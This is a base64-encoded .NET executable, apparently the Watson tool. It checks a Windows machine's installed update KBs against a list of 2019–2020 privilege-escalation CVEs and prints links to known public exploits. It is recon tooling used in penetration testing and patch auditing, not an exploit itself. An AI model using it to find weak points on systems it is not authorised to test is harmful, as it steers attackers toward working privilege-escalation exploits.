iBswkUAniUXICfXRQCebzQAAAoGBCgFAAArKAYAACssCwJymwwAcG8DAAAGKgAAEzAFADIBAAAHAAARcyYAAAoKAyCrPwAAMBkDIAAoAAAuRAMgOTgAAC5ZAyCrPwAALnIqAyBjRQAAMBQDIO5CAAAuewMgY0UAADuKAAAAKgMgukcAADuYAAAAAyC7RwAAO6cAAAAqBh8MjSAAAAEl0CwAAAQoMwAACm80AAAKOKEAAAAGGI0gAAABJRYgtAxFAJ4lFyABIkUAnm80AAAKOIAAAAAGHxCNIAAAASXQGAAABCgzAAAKbzQAAAorZgYfEY0gAAABJdATAAAEKDMAAApvNAAACitMBh8UjSAAAAEl0DUAAAQoMwAACm80AAAKKzIGHxWNIAAAASXQJAAABCgzAAAKbzQAAAorGAYfFY0gAAABJdAkAAAEKDMAAApvNAAACgYEKAUAACsoBgAAKywLAnIFCQBwbwMAAAYqAAATMAUA/gAAAAcAABFzJgAACgoDIKs/AAAwGQMgACgAAC4tAyA5OAAALkIDIKs/AAAuWCoDIO5CAAAuaQMgY0UAAC57AyC6RwAAO4oAAAAqBh8MjSAAAAEl0CwAAAQoMwAACm80AAAKOIQAAAAGGI0gAAABJRYgtAxFAJ4lFyABIkUAnm80AAAKK2YGHxCNIAAAASXQGAAABCgzAAAKbzQAAAorTAYfEY0gAAABJdATAAAEKDMAAApvNAAACisyBh8UjSAAAAEl0DUAAAQoMwAACm80AAAKKxgGHxWNIAAAASXQJAAABCgzAAAKbzQAAAoGBCgFAAArKAYAACssCwJylwgAcG8DAAAGKgAAEzAEAC0BAAAHAAARcyYAAAoKAyDXOgAAMBkDIAAoAAAuRAMgOTgAAC5ZAyDXOgAALm0qAyDuQgAAMBQDIKs/AAAudgMg7kIAADuFAAAAKgMgY0UAADuTAAAAAyC6RwAAO6IAAAAqBh8NjSAAAAEl0CYAAAQoMwAACm80AAAKOJwAAAAGGo0gAAABJdAdAAAEKDMAAApvNAAACjiAAAAABh8NjSAAAAEl0DQAAAQoMwAACm80AAAKK2YGHxKNIAAAASXQJwAABCgzAAAKbzQAAAorTAYfE40gAAABJdA3AAAEKDMAAApvNAAACisyBh8WjSAAAAEl0DYAAAQoMwAACm80AAAKKxgGHxeNIAAAASXQHAAABCgzAAAKbzQAAAoGBCgFAAArKAYAACssCwJyWgcAcG8DAAAGKgAAABMwBAD6AAAABwAAEXMmAAAKCgMg1zoAADAZAyAAKAAALi0DIDk4AAAuQgMg1zoAAC5UKgMgqz8AAC5lAyDuQgAALncDIGNFAAA7hgAAACoGHxeNIAAAASXQHgAABCgzAAAKbzQAAAo4gAAAAAYfEY0gAAABJdAbAAAEKDMAAApvNAAACitmBh8ejSAAAAEl0DAAAAQoMwAACm80AAAKK0wGHyGNIAAAASXQOQAABCgzAAAKbzQAAAorMgYfI40gAAABJdAqAAAEKDMAAApvNAAACisYBh8mjSAAAAEl0DEAAAQoMwAACm80AAAKBgQoBQAAKygGAAArLAsCckcDAHBvAwAABioAABMwBAAuAQAABwAAEXMmAAAKCgMg1zoAADAZAyAAKAAALkQDIDk4AAAuWQMg1zoAAC5uKgMg7kIAADAUAyCrPwAALncDIO5CAAA7hgAAACoDIGNFAAA7lAAAAAMgukcAADujAAAAKgYfEo0gAAABJdAiAAAEKDMAAApvNAAACjidAAAABh8LjSAAAAEl0BIAAAQoMwAACm80AAAKOIAAAAAGHwuNIAAAASXQEgAABCgzAAAKbzQAAAorZgYfGY0gAAABJdARAAAEKDMAAApvNAAACitMBh8bjSAAAAEl0C8AAAQoMwAACm80AAAKKzIGHx2NIAAAASXQMwAABCgzAAAKbzQAAAorGAYfH40gAAABJdAZAAAEKDMAAApvNAAACgYEKAUAACsoBgAAKywLAnIeBgBwbwMAAAYqAAATMAQA+gAAAAcAABFzJgAACgoDIKs/AAAwGQMgOTgAAC4tAyDXOgAALkIDIKs/AAAuVCoDIO5CAAAuZQMgY0UAAC53AyC6RwAAO4YAAAAqBh8OjSAAAAEl0BoAAAQoMwAACm80AAAKOIAAAAAGHxiNIAAAASXQFwAABCgzAAAKbzQAAAorZgYfHI0gAAABJdArAAAEKDMAAApvNAAACitMBh8ejSAAAAEl0DIAAAQoMwAACm80AAAKKzIGHyCNIAAAASXQIQAABCgzAAAKbzQAAAorGAYfIY0gAAABJdAtAAAEKDMAAApvNAAACgYEKAUAACsoBgAAKywLAnKiBQBwbwMAAAYqAAATMAQAsAAAAAcAABFzJgAACgoDIKs/AAAwEQMg1zoAAC4aAyCrPwAALiwqAyDuQgAALj0DIGNFAAAuTyoGHx6NIAAAASXQMAAABCgzAAAKbzQAAAorTAYfIY0gAAABJdA5AAAEKDMAAApvNAAACisyBh8jjSAAAAEl0CoAAAQoMwAACm80AAAKKxgGHyaNIAAAASXQMQAABCgzAAAKbzQAAAoGBCgFAAArKAYAACssCwJy3AQAcG8DAAAGKh4CKBEAAAoqSgNvCQAABgJ7OgAABCg3AAAKKi5zIQAABoA7AAAEKh4CKBEAAAoqHgNvCwAABioeA28LAAAGKh4DbwsAAAYqAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAFwNAAAjfgAAyA0AAKgUAAAjU3RyaW5ncwAAAABwIgAANBAAACNVUwCkMgAAEAAAACNHVUlEAAAAtDIAALgEAAAjQmxvYgAAAAAAAAACAAABV52iKQkKAAAA+gEzABYAAAEAAAAnAAAALgAAAD4AAAAkAAAALQAAADcAAAAMAAAAGAAAABkAAAAHAAAAAQAAAAMAAAAEAAAABgAAACkAAAABAAAAAwAAABsAAAAGAAAAAADDEQEAAAAAAAYAKxGHEwYAmBGHEwYAXxBVEw8ApxMAAAYAhxAyEgYADhEyEgYA7xAyEgYAfxEyEgYASxEyEgYAZBEyEgYAnhAyEgYAcxBoEwYAURBoEwYA0hAyEgYAuRDOEQYAIxQMEgYA2AHzDgYAygHzDgYANhCHEwYAswIMEgYAugLzDgoAyBI4FAoARBI4FF8AAhMAAAoAdxI4FAYAABAMEgYA6Q8MEg4AkQ+hEgYAvAHzDgYA9hLMEwYAyg8MEgYAGwIMEgYA6hEMEgYA4RLcDgoAFRQ4FAYAgRIMEgYA3xOHEwYAdRQMEgYA1g8MEgAAAABnCwAAAAABAAEAAQAQAJISExJBAAEAAQABABAAXxITEkEAAQADAAEAEAD7ERMSQQACAAcAAQAQAJcUExJBAAIACQABABAA8RETEkEABQAPAIABEAAWAw4PQQAFABIAgAEQAN0GDg9BAAYAEwCAARAACQoOD0EABwAUAIABEACmAw4PQQAIABUAgAEQAMcCDg9BAAkAFgCAARAA/gUOD0EACgAXAIABEAA0Cg4PQQALABgAgAEQAAwGDg9BAAwAGQCAARAAZwcOD0EADQAaAIABEAA9AA4PQQAOABsAgAEQADAEDg9BAA8AHACAARAAUAEOD0EAEAAdAAABAABwCwAAQQARAB4AAwEQAAgBAABBADoAHgADIRAA7w4AAEEAOwAgABMBAABKBwAAaQA/ACUAEwEAAHUHAABpAD8AJQATAQAAEwQAAGkAPwAlABMBAADsCQAAaQA/ACUAEwEAAD8CAABpAD8AJQATAQAAkgcAAGkAPwAlABMBAAA+BAAAaQA/ACUAEwEAABcKAABpAD8AJQATAQAAXAIAAGkAPwAlABMBAACvBwAAaQA/ACUAEwEAAKoAAABpAD8AJQATAQAA3QQAAGkAPwAlABMBAABCCgAAaQA/ACUAEwEAAHkCAABpAD8AJQATAQAAzAcAAGkAPwAlABMBAAABAAAAaQA/ACUAEwEAAG8JAABpAD8AJQATAQAA3wEAAGkAPwAlABMBAAAsBwAAaQA/ACUAEwEAAB8AAABpAD8AJQATAQAA9QMAAGkAPwAlABMBAADOCQAAaQA/ACUAEwEAAP0BAABpAD8AJQATAQAASwAAAGkAPwAlABMBAAAhAgAAaQA/ACUAIQC2E/wCIQA9DwQDIQBdDwcDAQAhDwsDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDUYDxDwQDMwERDA4DMwEVDRMDMwFlAxcDMwEkAxsDMwEqCCADMwE7BSQDMwF8BSkDMwHYDS4DMwHtCDIDMwFWDTcDMwG0AxcDMwEiCzsDMwG9BUADMwFbBDsDMwHVAhcDMwHUDDsDMwFfCkQDMwHpB0kDMwHrBiADMwGsCBsDMwGTDA4DMwGNCU0DMwFpAEkDMwFaDlEDMwFrCE0DMwEaBlUDMwEuCVoDMwFSDCADMwHHAF8DMwHQCy4DMwGXDSQDMwHhCmQDMwGgCmkDMwFeAWQDMwGcBG4DMwEZDk0DMwGPC3MDMwGbDngDMwGcBn0DMwFbBhcDMwH6BF8DBgAeDwQDNgBjC4EDFgCWAoUDFgAdAYUDFgCfAYUDUCAAAAAAlgCXEpIAAQC3IAAAAACGGCsTBgABAMAgAAAAAIYAug8QAAEA9iAAAAAAhhgrEwYAAgAMIQAAAACGAAkUBgACACQiAAAAAIEALRCOAwIAyCMAAAAAlgAaEpcDAgBHJQAAAACGGCsTBgADAE8lAAAAAIYIHxI9AQMAVyUAAAAAhgjuE50DAwBfJQAAAACGCJwPlgADAGclAAAAAIEIqw8VAAMAcCUAAAAAhhgrE6IDBACGJQAAAACGALoPBgAGAJAlAAAAAJYAOBOpAwYAVCYAAAAAlgCtErEDBgAIJwAAAACGGCsTBgAGABAnAAAAAJYA9RG1AwYA8CcAAAAAlgD1EbUDCQDQKAAAAACWAPURtQMMAAwqAAAAAJYA9RG1Aw8ASCsAAAAAlgD1EbUDEgC4LAAAAACWAPURtQMVAPgtAAAAAJYA9RG1AxgABC8AAAAAlgD1EbUDGwBAMAAAAACWAPURtQMeAEgxAAAAAJYA9RG1AyEAhDIAAAAAlgD1EbUDJACMMwAAAACWAPURtQMnAEg0AAAAAIYYKxMGACoAUDQAAAAAgwA6AcEDKgBjNAAAAACRGDETkgArAG80AAAAAIYYKxMGACsAdzQAAAAAgwCfAsEDKwB/NAAAAACDACYBwQMsAIc0AAAAAIMAqAHBAy0AAAABAB4PAAABAMcTAAABALYRAAABAB4PAAACAAAUAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABALcTAAACALwSAAADAEgTAAABAMwRAAABAPMRAAABAMwRAAABAPMRCQArEwEAEQArEwYAGQArEwoAKQArExAAMQArExAAOQArExAAQQArExAASQArExAAUQArExAAWQArExAAYQArExUAaQArExAAcQArExAAeQArExAAmQArEwYA2QD2DxoAgQArEwYADAArEywA4QBcFDIA4QAKEFkAFAAdE3cAHABKFIcA2QD2D4wA2QD2D5IA8QBiFJYA+QAcEAYA4QCHFJoA4QBWFKwAJAArEwYAJAAaD84ALAArEwYALAAaD+sALAADEvMA2QD2D/oA2QDsEgEBEQH2DxAALAB7FAcBNAArEwYAsQArEyIBsQA0FCgBuQAdEy0BwQBKFDIBGQEDEjgBgQDoET0BCQG8EUEBAQEkEEcBNAAaD84AwQBiFJYAIQF8Dz0BEQH2D04BKQFrFGcBNACID3EB4QAqFHsB4QCHFJUBCQGLFKABDgAUALgBDgAYANMBDgAcAO4BDgAgAAkCDgAkACQCDgAoAD8CDgAsAFoCDgAwAHUCDgA0AJACDgA4AKsCDgA8AMYCDgBAAOECLgALANQDLgATAN0DLgAbAPwDLgAjAAUELgArABUELgAzABUELgA7ABUELgBDAAUELgBLABsELgBTABUELgBbABUELgBjADMELgBrAF0ELgBzAGoEQQB7ALIEYQB7ALIEgQB7ALIEIAF7ALIEQAF7ALIEYAF7ALIEgAF7ALIEYwJ7ALIEgwJ7ALIEowJ7ALIEAQAQAAAAFgABACQAAAAXAAEALAAAABgAAQAwAAAAGQABADQAAAAaAAEAOAAAABsAAQBAAAAAHAABAEQAAAAdAAEASAAAAB4AAQBMAAAAHwABAFAAAAAgAAEAVAAAACEAAQBYAAAAIgABAFwAAAAjAAEAYAAAACQAAQBkAAAAJQABAGwAAAAmAAEAcAAAACcAAQB0AAAAKAABAHgAAAApAAEAfAAAACoAAQCAAAAAKwABAIQAAAAsAAEAjAAAAC0AAQCYAAAALgAfAEoAvgDUAA0BVAFfAQUAAQAAACMSxwMAAPITywMAAL8P0AMCAAkAAwACAAoABQACAAsABwABAAwABwAkAHAAgADHAOQAHAH4bAAAEQBgbQAAEgCQbQAAEwDYbQAAFAAwbgAAFQBgbgAAFgDQbgAAFwAwbwAAGABwbwAAGQDwbwAAGgAocAAAGwBwcAAAHADQcAAAHQDgcAAAHgBAcQAAHwCIcQAAIADocQAAIQBocgAAIgCwcgAAIwDgcgAAJAA4cwAAJQCgcwAAJgDYcwAAJwAgdAAAKABIdAAAKQCAdAAAKgAQdQAAKwCAdQAALACwdQAALQA4dgAALgB4dgAALwDodgAAMABgdwAAMQD4dwAAMgBweAAAMwDoeAAANAAgeQAANQBweQAANgDIeQAANwAYegAAOABgegAAOQAEgAAAAQAAAAAAAAAAAAAAAACLEgAABAAAAAAAAAAAAAAApgHmDgAAAAAEAAAAAAAAAAAAAACvATgUAAAAAAQAAAAAAAAAAAAAAKYBEBAAAAAAFAADABUAAwAWABMAFwATABgAEwAZABMAGgATABsAEwAcABMAHQATAB4AEwAfABMAIAATACEAEwAiABMAIwATACQAEwAlABMAJgATACcAEwAoABMAKQATACoAEwArABMALAATAC0AEwAuABMAJwBFACkARQA3AEUAOQBFAGsAkQFtAJEBAAAAAABfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTEwMABfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTEyMABDVkVfMjAxOV8xMTMwAF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9MTQwAEExRUE1MTZDOUJCMTkyRDk3NUExNEU1RDcwMTdEMDREQUFBNEY2NUI4NTJEQkNEMjA1NEM4QkIzMzNBRUVENTAAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT04MABCQkI4REU0QkRGM0FBRDQ3OUFCQTdENUM1MkU1RTJEMjA3RDdBMzk5MTUxN0RGRDZFMUZDODMzOTVFN0ExQUQwADw+Y19fRGlzcGxheUNsYXNzMV8wADw+OV9fM18wADxTaG93UmVzdWx0cz5iX18zXzAAPFNldEFzVnVsbmVyYWJsZT5iX18wAENWRV8yMDE5XzA4NDEAQ0I2RDBEMzY2QUYzNzFDMkZGQkFBMTEwNDQwNjAyMDRCMzBFQTMwNUQ1M0ExOTlFQkEzOUY3M0M1QTM1RThGMQA8PjlfXzNfMQA8U2hvd1Jlc3VsdHM+Yl9fM18xAElFbnVtZXJhYmxlYDEASUVudW1lcmF0b3JgMQBMaXN0YDEAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xMTIAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xMzIASW50MzIAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xNTIAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT01MgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTcyAF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9OTIAPD45X18zXzIAPFNob3dSZXN1bHRzPmJfXzNfMgBGdW5jYDIARGljdGlvbmFyeWAyAENWRV8yMDIwXzEwMTMANjVBOTdEQkFFRDM4MzA3NEZEODlFMzk0MTU2NkE5NTk5QjJDQzVEOEZFMDlGNDE1RDgwNEI2QjJGMzVEMTc0MwBDVkVfMjAxOV8xMjUzADE3RjM3Njc4NEJDQTgxMjQ3Njg1N0Y5NTBDRTc2MkUwN0U1OTNFMjhERENEM0JEMzFBNUREMDhENTU0QTBGNzMAMTUwNDQzQTIxRDgzNzYzMjlCQ0Q5MDVBOUE3MkY1ODQzNkNBNEU4ODcyQjBGODNEMjNEMDU4MTg3Nzg3Q0Y3MwBDVkVfMjAyMF8wNjgzADREREM1MjUzMUIxNDU5NDU2NDRENzNBOEEwMjBFQjIwNUI0NDU4QzQ3OEFEOEJCQTE3MEY4MUQ2MThEOUM4QTMAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xMjQAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT00NABDVkVfMjAxOV8xMDY0AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9NjQANjM3NTU0RUM3NTAyRDZEMjQ4NEQ2RERCRDRFRjY0RjE2QTc2RDI0RjIwQkQ1QzZGOEI3M0U1NEJCQUM1RDc3NABFMEVBRTU0QTQyMkFFQzUxRTIzNzJFNEE4QUMwOThFM0FDRjUxNDdEQkJGRjIzNzI3NzJEREMxRTEzMzU0NTg0AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9ODQARjFCQUUyQTU2RTNBMzA0RDVEMjc1NDRCNzYzQ0FBQkRDMzU1NUQwRkIxNzMxRDQ5RjFENTkzNDc3QTlCQTE5NAAxQUJCMTA3MEQwNDJGRUNCQjhFRTk2QjFGQjM3N0I0QkExODNFQTM0NEZBMEVERjI2QkQ0REIzNjE1RkNCQUE0ADFBREUyOEZBOUIyOTg4RjNCRDQyRjgwRERERUEyNTVDOTMwMjIwRkVDQTg0QkE0RkRGQjNENzAyNTgyM0JGRDQANUU1MEY4OURCRDFCOThGQTk5RjI1MUZGQzQwRUMzMjc3MkNGOTcwMjUwNzg1MTVBODlGMzlGMTFFRjkxQ0ZFNABDVkVfMjAxOV8xNDA1AENWRV8yMDE5XzEzMTUAQUMyOEQ3NTgxNEY4MUVCRjEyRTVGRTk4QjhDNTM5NjcwNzcyQTc0ODQyODI2M0M1REE3OUU0OTQyQzdDOEUxNQBFRjY0QTg5QzVGM0Y4NTZDMzcxMkFDNTlGRDlCNkJBNkRBOUY4MUQyMTJBRjBBQzM0MkMyMURFMUFFMDQ1QzY1AEVBRTVGNTM4RTAzRkU0QkJGMjM3MUMxQkNGRDQ4N0ZFQTMyNDlFOEY1QjUxMEMwMjM4REQ1MkI3RDE3Q0IxNzUAQ1ZFXzIwMTlfMTM4NQA5N0EyMEJGMTBGQkVFNkQzMTc3MUQwOTk4Qjg4QkY0QjhBN0VBNzhGN0FDMzcwMUE1Nzk2MDhBMzFDOUMzQjk1AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9MTE2AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9MTYAQ1ZFXzIwMTlfMDgzNgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTM2AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9NTYAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT03NgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTk2ADkzMTU2RjFFQ0I0MEI5QzlEQkE4OTgwNTM3NTAxMjAwOTk5MkRBM0JCRUY3NDY0QUI0NjE0OEFENTUzNjFBQjYAMUFCN0M4OTBCRDJCNUVCNjJDQUFDREM2RTgzMDIyQ0ZDMzY3NUE0RTE1NzZDODYwMjdCNkU0Njg2Njg0OUZFNgBBQUQzRjhBRDZDQjE5QkFEOTFEOEVEMDhCNEU3NTNFOUY3QzdFMjQyNTM1QkQ1RjFCOUZDNkI4MjVBRjJBOTE3ADk3RDgyQTYxRDYzOEQ1RUMzRTk5NDQ1OTlCMkRGRjJGN0Q2MjQ0Mzk5MkY3RjRFRDNBMzQwREZCNTRDRkNFMzcAMkFBNjNBRTk4QjBENzFCNDUxRjA0MkI0OThGNjVDMjNFRUE5OUQwNkE0N0EzQzk2MkU2RUE1RUM2NzRDQTM5NwBCNDEyNkU4MEFCQzI4MDkwMkJEMERGRUFCQUEyNEQxRUEzNDVBQkUwMkNDRjQ1MTYzNUJEQjFCRTJCQTVCMkQ3AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9MTA4ADlERjUwQTM3QTM2QjlFRjBCQkYwRTUyM0NENzM2NUVDMjA2RDY0N0NEMEFEQkMwQkVDM0NEOUEzMEMwRDg0MTgAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xMjgAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT00OABDVkVfMjAyMF8wNjY4AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9NjgAQ1ZFXzIwMTlfMTM4OABfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTg4ADhGQTEyMTg3RTM0OTM0RDUyOUZBQjBGREE2MTAxQ0YxQTZDQkJGNEYxOTYyRjIzMTQ1RkE3MjRFNjcxQUIwMTkAQzg5OUEyQ0JGQTZBRjE0QzVBRUY3NkMzQTczNjUyQjRCMzJCOEFEQTE5M0UxNzIyNUYzQjJGNjNGRjg1Q0U0OQBDN0U1NTdDMTAxMjAzQzlDMjYzRDU1ODgzMTk5NEUyQkYwMkRGMTc0OTRBOEM0NUJFMDNBRTkyMTUxRENCNjg5ADU2MzlCMUY1ODUxRkM1MTc5QjlFMTE3RURFMzdEMkMxRjI5MTc2NkU3QUE4REU3MTA5MjZEQUFEMzAwN0EwOTkAPD45ADxNb2R1bGU+ADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRhaWxzPgBFNjYyQTFFRThBOTk2NkI3REQ2OUI4M0FFQUYwN0MzRDMzREU3RkU5OTBENkFFNThGN0I4MUJFNDFDRUQzM0JBAEJGODg1QUExNDIxREVBRTRCRkZCQUUwRTg1RDZCNzg2MjhFOEFBMjEwODZFQ0VCRUI2RkM4MEM0MUM3RUZDQkEAMDZGMzA2RUYzMDdFN0UyODM5QzQxODgyNTA4QTVENEJGRjA0OTI1M0ZCMUVCNkE2MEExRkE4OEE4MzU2OUJEQgBCOUM3RTkwQzgwNzVDMzc4NDE2MUIxMzA1MTA3QTY3MjkxMzAyQzk1OEVENkQ3MDg2MTlBRUY2Q0RDRDg4MkNDADlDNDk5NTI5RThDRkJGNEI0QUE4OEUxODRENjI4MEJENkM3ODYwM0QwMEE4MkE0MzFCQjExRUVCMDFCNjE4NkQANzA4RUVGQzBENTRGRTlERkZEREI1QjAwQzM1REY3REZDQjNCRDkwQjEzM0JGQjMwRDAzOUM4QTAxMDUxMTNFRAAwREZEMjBERjAxMUIyMzRCNDY5Njc4NEVENDU0MzkwQ0VDMzM0RjM1RkY4OUJCRkExMUZGNTIxQUIzQUIxNzlFADM2MzEwMzA5QTQ5MTM4MUQwODQ2OURFNTM2OTJDM0ZEQjhFMUVFMTJCNDAxMzIxMjA4ODJENjcyMzVDOTBDQ0UAQzQxOUU3REE0N0IwMTgzRjU2Q0MxOEE0MDFBNjI1OTUwODA2Q0NGRTczN0JCQkI1OTA3OUYxRkRFRDQyQzBERQAyNjNCMUNGNDRCRkQ4MzM1Mjg4RjkyNjAyQzIzNTY2NDJCQzVEQzgyRTlEMTA5NEU2RkFGMjQ2RjZBQkY1OTBGAEUyMzczNzg5NzNGMDFGQTFDODA1OUM0MDY5ODY0OTIzNzE2QTA3MTVGRUNGMDg0NkI0NzQyQ0UxQzk1MDZGOEYAQTI0NUJBRDJCRDY5NDk2NkJBQUZFRjBBQTc4QzBBQzQwNDlCNUVBODFFOTk3NzE3MTlBRUMxQTA2NTc0QjdBRgBFN0Q1ODhCRDk3NDc3MTZEMTgwMTBENUVBQURGMzJBODBDNEQyNzA2MDZGM0Q3ODFGMDUyRjRGMEYyODVDNkZGAFN5c3RlbS5JTwBtc2NvcmxpYgA8PmMAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMAdzR0czBuLk1zcmMAQWRkAGlkADxWdWxuZXJhYmxlPmtfX0JhY2tpbmdGaWVsZAA8SWRlbnRpZmljYXRpb24+a19fQmFja2luZ0ZpZWxkADxLbm93bkV4cGxvaXRzPmtfX0JhY2tpbmdGaWVsZABnZXRfTWVzc2FnZQBBZGRSYW5nZQBFbnVtZXJhYmxlAGdldF9WdWxuZXJhYmxlAHNldF9WdWxuZXJhYmxlAFNldEFzVnVsbmVyYWJsZQBJRGlzcG9zYWJsZQBSdW50aW1lRmllbGRIYW5kbGUAQ29uc29sZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAV2hlcmUAU3lzdGVtLkNvcmUARGlzcG9zZQBUcnlQYXJzZQBQb3B1bGF0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB2YWx1ZQBSZW1vdmUAV2F0c29uLmV4ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAFRvU3RyaW5nAFdtaQBDaGVjawBQcm9ncmFtAGdldF9JdGVtAFN5c3RlbQB3NHRzMG4ATWFpbgBnZXRfSWRlbnRpZmljYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWFuYWdlbWVudE9iamVjdENvbGxlY3Rpb24AVnVsbmVyYWJpbGl0eUNvbGxlY3Rpb24ATWFuYWdlbWVudEV4Y2VwdGlvbgBXYXRzb24ASW5mbwBQcmludExvZ28AU3lzdGVtLkxpbnEAR2V0QnVpbGROdW1iZXIAYnVpbGROdW1iZXIATWFuYWdlbWVudE9iamVjdFNlYXJjaGVyAFRleHRXcml0ZXIAZ2V0X0Vycm9yAElFbnVtZXJhdG9yAE1hbmFnZW1lbnRPYmplY3RFbnVtZXJhdG9yAEdldEVudW1lcmF0b3IALmN0b3IALmNjdG9yAEdldEluc3RhbGxlZEtCcwBpbnN0YWxsZWRLQnMAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAF92dWxuZXJhYmlsaXRpZXMAYXJncwBTeXN0ZW0uQ29sbGVjdGlvbnMAUnVudGltZUhlbHBlcnMAZ2V0X0tub3duRXhwbG9pdHMAZXhwbG9pdHMAU2hvd1Jlc3VsdHMATWFuYWdlbWVudEJhc2VPYmplY3QASW50ZXJzZWN0AEdldABTeXN0ZW0uTWFuYWdlbWVudABnZXRfQ3VycmVudABDb3VudABGaXJzdABNb3ZlTmV4dABJbml0aWFsaXplQXJyYXkAQ29udGFpbnNLZXkAQW55AG9wX0VxdWFsaXR5AFZ1bG5lcmFiaWxpdHkAAAAAAEkgACAAXwBfACAAIAAgACAAXwBfACAAIAAgACAAIAAgAF8AIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAASSAALwAgAC8AIAAvAFwAIABcACAAXABfAF8AIABfAHwAIAB8AF8AIABfAF8AXwAgACAAXwBfAF8AIAAgAF8AIABfAF8AIAAgAABJIABcACAAXAAvACAAIABcAC8AIAAvACAAXwBgACAAfAAgAF8AXwAvACAAXwBfAHwALwAgAF8AIABcAHwAIAAnAF8AIABcACAAAUkgACAAXAAgACAALwBcACAAIAAvACAAKABfAHwAIAB8ACAAfABfAFwAXwBfACAAXAAgACgAXwApACAAfAAgAHwAIAB8ACAAfAAASSAAIAAgAFwALwAgACAAXAAvACAAXABfAF8ALABfAHwAXABfAF8AfABfAF8AXwAvAFwAXwBfAF8ALwB8AF8AfAAgAHwAXwB8AABHIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAABHIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdgAyAC4AMAAgACAAIAAgAABDIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAF8AUgBhAHMAdABhAE0AbwB1AHMAZQANAAoAACsgAFsAIQBdACAAewAwAH0AIAA6ACAAVgBVAEwATgBFAFIAQQBCAEwARQAAEyAAIABbAD4AXQAgAHsAMAB9AABrIABbACoAXQAgAEYAaQBuAGkAcwBoAGUAZAAuACAARgBvAHUAbgBkACAAewAwAH0AIABwAG8AdABlAG4AdABpAGEAbAAgAHYAdQBsAG4AZQByAGEAYgBpAGwAaQB0AGkAZQBzAC4ADQAKAABTIABbACoAXQAgAEYAaQBuAGkAcwBoAGUAZAAuACAARgBvAHUAbgBkACAAMAAgAHYAdQBsAG4AZQByAGEAYgBpAGwAaQB0AGkAZQBzAC4ADQAKAAAbQwBWAEUALQAyADAAMQA5AC0AMAA4ADMANgABS2gAdAB0AHAAcwA6AC8ALwBlAHgAcABsAG8AaQB0AC0AZABiAC4AYwBvAG0ALwBlAHgAcABsAG8AaQB0AHMALwA0ADYANwAxADgAAYEraAB0AHQAcABzADoALwAvAGQAZQBjAG8AZABlAHIALgBjAGwAbwB1AGQALwAyADAAMQA5AC8AMAA0AC8AMgA5AC8AYwBvAG0AYgBpAG4AaQBnAC0AbAB1AGEAZgB2AC0AcABvAHMAdABsAHUAYQBmAHY